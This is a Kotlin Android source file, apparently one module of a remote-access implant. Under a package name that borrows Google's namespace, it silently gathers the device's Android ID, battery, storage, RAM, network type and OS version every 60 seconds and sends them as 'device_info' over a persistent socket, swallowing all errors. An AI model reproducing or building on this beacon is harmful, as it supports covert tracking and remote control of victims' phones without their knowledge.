package com.google.xmodzz

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.StatFs
import org.json.JSONObject

object DeviceInfoRechive {
    fun start(ctx: Context) {
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                sendInfo(ctx)
                handler.postDelayed(this, 60000)
            }
        }
        handler.post(runnable)
    }

    private fun sendInfo(ctx: Context) {
        try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val isCharging = bm.isCharging
            
            val stat = StatFs(Environment.getDataDirectory().path)
            val blockSize = stat.blockSizeLong
            val totalBlocks = stat.blockCountLong
            val availableBlocks = stat.availableBlocksLong
            val totalGB = (totalBlocks * blockSize) / (1024 * 1024 * 1024)
            val availableGB = (availableBlocks * blockSize) / (1024 * 1024 * 1024)
            
            val runtime = Runtime.getRuntime()
            val maxMemory = runtime.maxMemory() / (1024 * 1024 * 1024)
            val usedMemory = (runtime.totalMemory() - runtime.freeMemory()) / (1024 * 1024 * 1024)

            val payload = JSONObject()
            payload.put("android_id", Utils.getAndroidId(ctx))
            payload.put("battery", if (isCharging) "$batLevel% (Charging)" else "$batLevel%")
            payload.put("storage", "$availableGB GB / $totalGB GB")
            payload.put("ram", "$usedMemory GB / $maxMemory GB")
            payload.put("network", if (isWifiConnected(ctx)) "WiFi" else "Cellular")
            payload.put("androidVer", "Android " + Build.VERSION.RELEASE)
            payload.put("sdk", Build.VERSION.SDK_INT)
            
            if (SocketHolder.socket != null && SocketHolder.socket!!.connected()) {
                SocketHolder.socket!!.emit("device_info", payload)
            }
        } catch (e: Exception) { }
    }

    private fun isWifiConnected(ctx: Context): Boolean {
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val activeNetwork = cm.activeNetworkInfo
        return activeNetwork != null && activeNetwork.type == android.net.ConnectivityManager.TYPE_WIFI
    }
}
